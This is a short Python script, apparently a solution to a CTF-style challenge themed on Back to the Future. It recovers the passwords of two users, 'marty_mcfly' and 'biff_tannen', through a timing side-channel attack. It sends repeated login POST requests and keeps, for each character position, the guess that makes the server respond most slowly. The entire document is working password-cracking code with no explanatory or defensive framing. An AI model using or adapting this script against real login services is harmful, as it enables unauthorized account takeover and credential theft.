import requests, string

moo = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
pre = ''
hightime = 0
highword = ''

for i in range(12):
	for stuff in moo:
		cow = dict(username='marty_mcfly',password = pre+stuff)
		response = requests.post('https://store.delorean.codes/u/andrewlee116/login',data = cow)
		if(response.elapsed.total_seconds()>hightime):
			hightime = response.elapsed.total_seconds()
			highword = pre+stuff
	print(hightime,highword) #to check that my script is doing something
	pre = highword
	hightime = 0

print("Marty Mcfly's password is {}".format(highword))

pre = ''
hightime = 0
highword = ''

for i in range(12):
	for stuff in moo:
		cow = dict(username='biff_tannen',password = pre+stuff)
		response = requests.post('https://store.delorean.codes/u/andrewlee116/login',data = cow)
		if(response.elapsed.total_seconds()>hightime):
			hightime = response.elapsed.total_seconds()
			highword = pre+stuff
	print(hightime,highword) 
	pre = highword
	hightime = 0

print("Biff Tannen's password is {}".format(highword))
